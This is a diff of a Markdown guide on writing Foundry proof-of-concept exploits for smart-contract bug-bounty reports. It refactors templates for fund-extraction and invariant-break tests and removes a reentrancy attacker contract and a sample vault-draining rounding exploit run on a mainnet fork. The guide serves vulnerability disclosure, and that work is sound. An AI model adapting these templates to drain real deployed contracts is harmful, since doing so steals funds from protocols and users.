@@ -181,125 +181,184 @@ function testFinding() public {
 Before writing code, answer one question:
 
 **Does the attacker extract value (tokens/ETH)?**
-- **Yes** → Write a **Value Extraction PoC** (most common)
+- **Yes** → Write a **Value Extraction PoC**
 - **No** → Write an **Invariant Break PoC** (unauthorized execution)
 
 That's it. Don't overthink it.
 
 ---
 
-## Template 1: Value Extraction PoC (Most Common)
+## Template 1: Value Extraction PoC
 
-Use this when the attacker steals/drains/mints tokens or ETH.
+Use this for fund extraction when the attacker steals/drains/mints tokens or ETH etc.
 
 ### Minimal Working Template
 
 ```solidity
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.13;
+pragma solidity ^0.8.19;
 
 import "forge-std/Test.sol";
 import "forge-std/console2.sol";
 
-// Import target contract
 import {VulnerableContract} from "src/VulnerableContract.sol";
 import {IERC20} from "src/interfaces/IERC20.sol";
-
+import {...}
+import {...}
+/**
+ * @title ExploitPoC
+ *
+ * @notice
+ *  Demonstrating funds-extraction vulnerabilities
+ *  in a way that is fully real without any false assumption.
+ *
+ *  Impact Requirement (paraphrased):
+ *  ------------------------------------------------------------
+ *  “The vulnerability must result in a direct loss of funds
+ *   for users or the protocol, with a measurable economic impact.”
+ *
+ *  This enforces that requirement by:
+ *   - Snapshotting attacker and victim balances pre-exploit
+ *   - Executing the exploit
+ *   - Asserting attacker profit > 0
+ *   - Asserting victim loss > 0
+ *
+ *  If either condition fails, the PoC fails.
+ */
 contract ExploitTest is Test {
-    // ═══════════════════════════════════════════════════════════
-    // SETUP
-    // ═══════════════════════════════════════════════════════════
-    
+    /*//////////////////////////////////////////////////////////////
+                                SETUP
+    //////////////////////////////////////////////////////////////*/
+
     VulnerableContract public target;
     IERC20 public token;
-    
-    address attacker = makeAddr("attacker");
-    address victim = makeAddr("victim");
-    
-    // Mainnet addresses (if forking)
-    address constant MAINNET_TOKEN = 0x...; // Replace with actual
-    address constant MAINNET_VAULT = 0x...; // Replace with actual
-    uint256 constant FORK_BLOCK = 19_500_000; // Recent block
-    
+
+    address public attacker;
+    address public victim;
+
+    address constant MAINNET_TOKEN = 0x...;
+    address constant MAINNET_VAULT = 0x...;
+    uint256 constant FORK_BLOCK = 19_500_000;
+
+    bool internal snapshotted;
+
+    struct BalanceSnapshot {
+        address token;           // Asset being tracked (ERC20, LP token, etc.)
+        uint256 attackerBefore;  // Attacker balance before exploit
+        uint256 victimBefore;    // Victim / protocol balance before exploit
+    }
+
+    BalanceSnapshot[] internal snapshots;
+
     function setUp() public {
-        // Option A: Mainnet fork (for deployed contracts)
         vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK);
+
         target = VulnerableContract(MAINNET_VAULT);
         token = IERC20(MAINNET_TOKEN);
-        
-        // Option B: Local deployment (for pre-deployment)
-        // target = new VulnerableContract();
-        // token = new MockERC20();
-        
-        // Fund attacker with gas
+
+        attacker = makeAddr("attacker");
+        victim = address(target);
+
         vm.deal(attacker, 10 ether);
-        
-        // Fund attacker with initial tokens (if needed)
-        // Method 1: From whale
-        address whale = 0x...; // Find on Etherscan
+
+        // Seed ONLY the capital required to trigger the exploit
+        address whale = 0x...;
         vm.prank(whale);
-        token.transfer(attacker, 1000e18);
-        
-        // Method 2: Deal (only for testing tokens, not target contract)
-        // deal(address(token), attacker, 1000e18);
-        
-        // Label for readable traces
+        token.transfer(attacker, 1_000e18);
+
+        vm.label(attacker, "Attacker");
         vm.label(address(target), "VulnerableVault");
         vm.label(address(token), "Token");
-        vm.label(attacker, "Attacker");
     }
-    
-    // ═══════════════════════════════════════════════════════════
-    // THE EXPLOIT
-    // ═══════════════════════════════════════════════════════════
-    
-    function testExploit() public {
-        // Record balances before
-        uint256 attackerBefore = token.balanceOf(attacker);
-        uint256 victimBefore = token.balanceOf(address(target));
-        
-        console.log("=== Before ===");
-        console.log("Attacker balance:", attackerBefore / 1e18);
-        console.log("Vault balance:", victimBefore / 1e18);
-        
-        // Execute exploit as attacker
+
+    /*//////////////////////////////////////////////////////////////
+                        PHASE 1 — SNAPSHOT
+    //////////////////////////////////////////////////////////////*/
+    /**
+     * @notice Records pre-exploit balances.
+     *
+     * @dev
+     *  This MUST be called after any seed funding required
+     *  to trigger the exploit, and BEFORE exploit execution.
+     *
+     *  This ensures seed capital is not miscounted as profit.
+     */
+    function snapshotBalances(address _token) internal {
+        require(!snapshotted, "Snapshot already taken");
+
+        snapshots.push(
+            BalanceSnapshot({
+                token: _token,
+                attackerBefore: IERC20(_token).balanceOf(attacker),
+                victimBefore: IERC20(_token).balanceOf(victim)
+            })
+        );
+
+        snapshotted = true;
+    }
+
+    /*//////////////////////////////////////////////////////////////
+                        PHASE 2 — EXPLOIT
+    //////////////////////////////////////////////////////////////*/
+
+    function executeExploit() internal {
+        require(snapshotted, "Snapshot not taken");
+
         vm.startPrank(attacker);
-        {
-            // Step 1: [Describe what you're doing]
-            token.approve(address(target), type(uint256).max);
-            target.deposit(1000e18);
-            
-            // Step 2: [Trigger vulnerability]
-            // Example: Reentrancy, rounding error, oracle manipulation, etc.
-            target.vulnerableFunction();
-            
-            // Step 3: [Extract profit]
-            target.withdraw(target.balanceOf(attacker));
-        }
+
+        token.approve(address(target), type(uint256).max);
+
+        // Step 1: Legitimate interaction
+        target.deposit(1_000e18);
+
+        // Step 2: Trigger vulnerability
+        target.vulnerableFunction();
+
+        // Step 3: Extract funds
+        target.withdraw(target.balanceOf(attacker));
+
         vm.stopPrank();
-        
-        // Record balances after
-        uint256 attackerAfter = token.balanceOf(attacker);
-        uint256 victimAfter = token.balanceOf(address(target));
-        
-        console.log("\n=== After ===");
-        console.log("Attacker balance:", attackerAfter / 1e18);
-        console.log("Vault balance:", victimAfter / 1e18);
-        
-        // Calculate impact
-        uint256 profit = attackerAfter - attackerBefore;
-        uint256 loss = victimBefore - victimAfter;
-        
-        console.log("\n=== Impact ===");
-        console.log("Attacker profit:", profit / 1e18);
-        console.log("Vault loss:", loss / 1e18);
-        
-        // Verify exploit worked
-        assertGt(profit, 0, "Attacker should profit");
-        assertGt(loss, 0, "Vault should lose funds");
-        
-        // Optional: Verify it's economically significant
-        // assertGt(profit, 10_000e18, "Profit should exceed $10k");
+    }
+
+    /*//////////////////////////////////////////////////////////////
+                        PHASE 3 — ASSERTIONS
+    //////////////////////////////////////////////////////////////*/
+
+    function assertEconomicImpact() internal {
+        bool hasProfit;
+        bool victimHarmed;
+
+        for (uint256 i = 0; i < snapshots.length; i++) {
+            BalanceSnapshot memory s = snapshots[i];
+
+            uint256 attackerAfter =
+                IERC20(s.token).balanceOf(attacker);
+            uint256 victimAfter =
+                IERC20(s.token).balanceOf(victim);
+
+            uint256 profit = attackerAfter - s.attackerBefore;
+            uint256 loss = s.victimBefore - victimAfter;
+
+            console2.log("\nToken:", s.token);
+            console2.log("Attacker profit:", profit / 1e18);
+            console2.log("Victim loss:", loss / 1e18);
+
+            if (profit > 0) hasProfit = true;
+            if (loss > 0) victimHarmed = true;
+        }
+
+        require(hasProfit, "PoC: attacker did not profit");
+        require(victimHarmed, "PoC: victim did not lose funds");
+    }
+
+    /*//////////////////////////////////////////////////////////////
+                            TEST ENTRY
+    //////////////////////////////////////////////////////////////*/
+
+    function testExploit() external {
+        snapshotBalances(address(token));
+        executeExploit();
+        assertEconomicImpact();
     }
 }
 ```
@@ -328,62 +387,89 @@ Examples:
 
 ```solidity
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.13;
-
-import "forge-std/Test.sol";
-import "forge-std/console2.sol";
+pragma solidity ^0.8.19;
 
 import {VulnerableContract} from "src/VulnerableContract.sol";
+import {InvariantBreakHarness} from "./InvariantBreakHarness.sol";
 
-contract InvariantBreakTest is Test {
+contract InvalidLiquidationTest is InvariantBreakHarness {
     VulnerableContract public target;
-    
-    address attacker = makeAddr("attacker");
-    address victim = makeAddr("victim");
-    
+
+// Local PoC
     function setUp() public {
-        // Deploy or fork
+        attacker = makeAddr("attacker");
+        victim = makeAddr("victim");
+
         target = new VulnerableContract();
-        
-        // Setup victim in a "safe" state that should be protected
+
+        // Victim enters a protected / safe state
         vm.prank(victim);
         target.createSafePosition();
-        
+
         vm.deal(attacker, 1 ether);
+
+        vm.label(attacker, "Attacker");
+        vm.label(victim, "Victim");
+        vm.label(address(target), "VulnerableProtocol");
     }
-    
-    function testInvariantBreak() public {
-        // State the invariant being tested
-        console.log("=== Testing Invariant ===");
-        console.log("RULE: Only insolvent positions can be liquidated");
-        console.log("Victim solvency:", target.getSolvencyRatio(victim));
-        
-        // Verify victim is in "safe" state
-        assertTrue(target.isSolvent(victim), "Victim should be solvent");
-        
-        // Attacker attempts unauthorized action
-        vm.startPrank(attacker);
-        {
-            // This should fail if invariant holds, but won't because of bug
-            target.liquidate(victim);
-        }
-        vm.stopPrank();
-        
-        // Verify the invariant was broken
-        console.log("\n=== After Attack ===");
-        console.log("Liquidation executed:", target.wasLiquidated(victim));
-        
-        // Assert the unauthorized execution occurred
-        assertTrue(
-            target.wasLiquidated(victim),
-            "Solvent position was liquidated (invariant broken)"
-        );
-        
-        // Show the downstream impact
-        uint256 victimLoss = target.calculateLiquidationPenalty(victim);
-        console.log("Victim penalty:", victimLoss / 1e18);
-        
-        assertGt(victimLoss, 0, "Victim suffered loss from invalid liquidation");
+
+// Mainnet PoC (fork)
+    function setUp() public {
+    vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 19_500_000);
+
+    attacker = makeAddr("attacker");
+    victim = 0xREAL_USER;
+
+    target = VulnerableContract(0xDEPLOYED_ADDRESS);
+
+    require(target.isSolvent(victim), "Victim not solvent");
+    }
+
+    /*//////////////////////////////////////////////////////////////
+                        INVARIANT DEFINITION
+    //////////////////////////////////////////////////////////////*/
+
+    /**
+     * INVARIANT:
+     *  Solvent positions MUST NOT be liquidatable.
+     */
+    function _invariantHolds() internal view override returns (bool) {
+        return target.isSolvent(victim);
+    }
+
+    /*//////////////////////////////////////////////////////////////
+                    UNAUTHORIZED ACTION
+    //////////////////////////////////////////////////////////////*/
+
+    /**
+     * @dev
+     *  This call should be impossible while the invariant holds.
+     *  Its success proves unauthorized execution.
+     */
+    function _executeUnauthorizedAction() internal override {
+        target.liquidate(victim);
+    }
+
+    /*//////////////////////////////////////////////////////////////
+                        DOWNSTREAM IMPACT
+    //////////////////////////////////////////////////////////////*/
+
+    /**
+     * @dev
+     *  Liquidation of a solvent position causes forced penalty / loss.
+     *  This satisfies Immunefi’s impact requirement even if
+     *  the attacker does not receive funds directly.
+     */
+    function _computeImpact() internal view override returns (uint256) {
+        return target.calculateLiquidationPenalty(victim);
+    }
+
+    /*//////////////////////////////////////////////////////////////
+                            TEST ENTRY
+    //////////////////////////////////////////////////////////////*/
+
+    function testInvalidLiquidation() external {
+        _assertInvariantBreak();
     }
 }
 ```
@@ -400,7 +486,15 @@ Use **Invariant Break** template when:
 - Show what function executed that shouldn't have
 - Show the victim's loss or protocol damage
 - Show why this matters economically
+- Proves unauthorized execution + concrete harm
 
+| Dimension                    | Refactored              |
+| ---------------------------- | ----------------------- |
+| Invariant formalization      | **Explicit & enforced** |
+| Unauthorized execution proof | **Structural**          |
+| Impact requirement           | **Mandatory**           |
+| Reusability                  | **High**                |
+| Judge clarity                | **Very High**           |
 ---
 
 ## Common Patterns & Helpers
@@ -478,46 +572,6 @@ function testMultiTxExploit() public {
     assertGt(token.balanceOf(attacker), initialBalance);
 }
 ```
-
-### Pattern 5: Reentrancy Template
-
-```solidity
-contract AttackerContract {
-    VulnerableContract public target;
-    uint256 public attackDepth;
-    
-    constructor(address _target) {
-        target = VulnerableContract(_target);
-    }
-    
-    function attack() external {
-        target.withdraw();
-    }
-    
-    // Reentrancy callback
-    receive() external payable {
-        if (attackDepth < 3) {
-            attackDepth++;
-            target.withdraw();
-        }
-    }
-}
-
-// In your test
-function testReentrancy() public {
-    AttackerContract attackerContract = new AttackerContract(address(target));
-    
-    // Fund the attack contract
-    vm.deal(address(attackerContract), 1 ether);
-    
-    // Execute
-    attackerContract.attack();
-    
-    // Verify
-    assertGt(address(attackerContract).balance, 1 ether);
-}
-```
-
 ---
 
 ## Rules for Realistic PoCs
@@ -613,84 +667,6 @@ Quick checks:
 - [ ] Works on mainnet fork with real addresses or the realistic local deployment
 - [ ] No unnecessary complexity - keep it as simple as possible to demonstrate the bug
 - [ ] Code is minimal - no unnecessary complexity
-
----
-
-## Example: Complete Real PoC
-
-Here's what a real, working PoC looks like:
-
-```solidity
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.13;
-
-import "forge-std/Test.sol";
-import {Vault} from "src/Vault.sol";
-import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-
-contract RoundingExploitTest is Test {
-    Vault public vault;
-    IERC20 public token;
-    
-    address attacker = makeAddr("attacker");
-    
-    function setUp() public {
-        // Fork mainnet
-        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
-        
-        vault = Vault(0x123...); // Real vault address
-        token = IERC20(vault.asset());
-        
-        // Get tokens from whale
-        address whale = 0xabc...; // Top USDC holder
-        vm.prank(whale);
-        token.transfer(attacker, 1_000_000e6); // $1M USDC
-        
-        vm.label(address(vault), "Vault");
-        vm.label(attacker, "Attacker");
-    }
-    
-    function testRoundingExploit() public {
-        uint256 vaultBalanceBefore = token.balanceOf(address(vault));
-        
-        console.log("Vault balance:", vaultBalanceBefore / 1e6, "USDC");
-        
-        vm.startPrank(attacker);
-        
-        // Exploit: Deposit and immediately withdraw with rounding in attacker's favor
-        token.approve(address(vault), type(uint256).max);
-        
-        // Large deposit
-        vault.deposit(1_000_000e6, attacker);
-        
-        // Trigger rounding bug by withdrawing 1 wei less
-        vault.withdraw(vault.maxWithdraw(attacker) - 1, attacker, attacker);
-        
-        vm.stopPrank();
-        
-        uint256 vaultBalanceAfter = token.balanceOf(address(vault));
-        uint256 profit = token.balanceOf(attacker) - 1_000_000e6;
-        
-        console.log("Vault balance:", vaultBalanceAfter / 1e6, "USDC");
-        console.log("Attacker profit:", profit / 1e6, "USDC");
-        
-        // Vault lost funds due to rounding
-        assertLt(vaultBalanceAfter, vaultBalanceBefore);
-        
-        // Attacker gained funds
-        assertGt(profit, 0);
-        
-        console.log("\nExploit successful! Drained", (vaultBalanceBefore - vaultBalanceAfter) / 1e6, "USDC");
-    }
-}
-```
-
-This PoC is:
-- **Clean** - No excessive comments or structure
-- **Realistic** - Uses real mainnet contracts
-- **Minimal** - Only the exploit steps
-- **Clear** - Console logs show the impact
-- **Proven** - Assertions verify it worked
 
 ---
 
